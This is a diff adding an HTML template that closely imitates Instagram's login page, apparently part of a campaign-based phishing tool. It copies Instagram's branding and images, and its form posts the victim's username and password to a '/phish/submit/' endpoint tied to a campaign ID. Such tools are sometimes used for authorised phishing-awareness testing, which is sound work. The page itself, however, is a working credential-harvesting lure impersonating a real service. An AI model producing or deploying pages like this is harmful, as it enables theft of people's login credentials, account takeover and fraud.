@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fafafa;
+            color: #262626;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .phone-container {
+            margin-right: 32px;
+            display: none;
+        }
+        
+        .login-container {
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        
+        .instagram-logo {
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTc1IiBoZWlnaHQ9IjUxIiB2aWV3Qm94PSIwIDAgMTc1IDUxIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNNDUuNSAyNS41QzQ1LjUgMzUuNzE3MyAzNy4yMTczIDQ0IDI3IDQ0UzguNSAzNS43MTczIDguNSAyNS41UzE2Ljc4MjcgNyAyNyA3UzQ1LjUgMTUuMjgyNyA0NS41IDI1LjVaIiBzdHJva2U9IiMwMDAwMDAiIHN0cm9rZS13aWR0aD0iMyIvPgo8Y2lyY2xlIGN4PSIyNyIgY3k9IjI1LjUiIHI9IjYuNSIgc3Ryb2tlPSIjMDAwMDAwIiBzdHJva2Utd2lkdGg9IjMiLz4KPGNpcmNsZSBjeD0iMzcuNSIgY3k9IjEzLjUiIHI9IjIuNSIgZmlsbD0iIzAwMDAwMCIvPgo8L3N2Zz4K');
+            width: 175px;
+            height: 51px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            margin: 0 auto 32px;
+        }
+        
+        .instagram-text {
+            font-size: 27px;
+            font-weight: 300;
+            margin: 0 auto 32px;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-family: 'Billabong', cursive;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 6px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            border: 1px solid #efefef;
+            border-radius: 3px;
+            background: #fafafa;
+            font-size: 12px;
+            line-height: 14px;
+            color: #262626;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        
+        .form-input::placeholder {
+            color: #8e8e8e;
+        }
+        
+        .login-button {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 5px 9px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 8px 0;
+            min-height: 32px;
+        }
+        
+        .login-button:hover {
+            background: #1877f2;
+        }
+        
+        .login-button:disabled {
+            background: #b2dffc;
+            cursor: not-allowed;
+        }
+        
+        .divider-container {
+            margin: 10px 40px 18px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .divider-text {
+            margin: 0 18px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #8e8e8e;
+            text-transform: uppercase;
+        }
+        
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 14px;
+            text-decoration: none;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .facebook-login:hover {
+            color: #385185;
+            text-decoration: none;
+        }
+        
+        .facebook-icon {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+        }
+        
+        .forgot-password {
+            color: #385185;
+            text-decoration: none;
+            font-size: 12px;
+            line-height: 14px;
+        }
+        
+        .forgot-password:hover {
+            color: #385185;
+            text-decoration: none;
+        }
+        
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .signup-link:hover {
+            color: #0095f6;
+            text-decoration: none;
+        }
+        
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .app-download p {
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        
+        .app-download-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .app-download-buttons img {
+            height: 40px;
+        }
+        
+        @media (min-width: 876px) {
+            .main-container {
+                flex-direction: row;
+                align-items: center;
+                justify-content: center;
+                max-width: 935px;
+                width: 100%;
+            }
+            
+            .phone-container {
+                display: block;
+                margin-right: 32px;
+            }
+            
+            .phone-mockup {
+                width: 454px;
+                height: 618px;
+                background: url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/QN95VQQ-TEB.png') no-repeat;
+                background-size: contain;
+            }
+        }
+        
+        @media (max-width: 450px) {
+            .login-box {
+                padding: 40px 20px 20px;
+                border: none;
+                background: transparent;
+            }
+            
+            .signup-box {
+                border: none;
+                background: transparent;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="phone-container">
+            <div class="phone-mockup"></div>
+        </div>
+        
+        <div class="login-container">
+            <div class="login-box">
+                <div class="instagram-text">Instagram</div>
+                
+                <form method="POST" action="/phish/submit/{{ campaign.id if campaign else '' }}">
+                    <div class="form-group">
+                        <input type="text" name="username" class="form-input" 
+                               placeholder="Phone number, username, or email" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" name="password" class="form-input" 
+                               placeholder="Password" required>
+                    </div>
+                    
+                    <button type="submit" class="login-button">Log In</button>
+                </form>
+                
+                <div class="divider-container">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">or</div>
+                    <div class="divider-line"></div>
+                </div>
+                
+                <a href="#" class="facebook-login">
+                    <svg class="facebook-icon" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                    Log in with Facebook
+                </a>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+            
+            <div class="signup-box">
+                Don't have an account? <a href="#" class="signup-link">Sign up</a>
+            </div>
+            
+            <div class="app-download">
+                <p>Get the app.</p>
+                <div class="app-download-buttons">
+                    <a href="#">
+                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store">
+                    </a>
+                    <a href="#">
+                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Form validation and submission tracking
+        document.querySelector('form').addEventListener('submit', function(e) {
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!username || !password) {
+                e.preventDefault();
+                alert('Please fill in all fields.');
+                return false;
+            }
+            
+            // Enable/disable login button based on input
+            const loginButton = document.querySelector('.login-button');
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
+            
+            // Track form submission
+            console.log('Instagram login form submitted');
+        });
+        
+        // Dynamic button state
+        document.addEventListener('DOMContentLoaded', function() {
+            const usernameInput = document.querySelector('input[name="username"]');
+            const passwordInput = document.querySelector('input[name="password"]');
+            const loginButton = document.querySelector('.login-button');
+            
+            function updateButtonState() {
+                if (usernameInput.value && passwordInput.value) {
+                    loginButton.disabled = false;
+                    loginButton.style.background = '#0095f6';
+                } else {
+                    loginButton.disabled = true;
+                    loginButton.style.background = '#b2dffc';
+                }
+            }
+            
+            usernameInput.addEventListener('input', updateButtonState);
+            passwordInput.addEventListener('input', updateButtonState);
+            
+            // Initial state
+            updateButtonState();
+        });
+    </script>
+</body>
+</html>
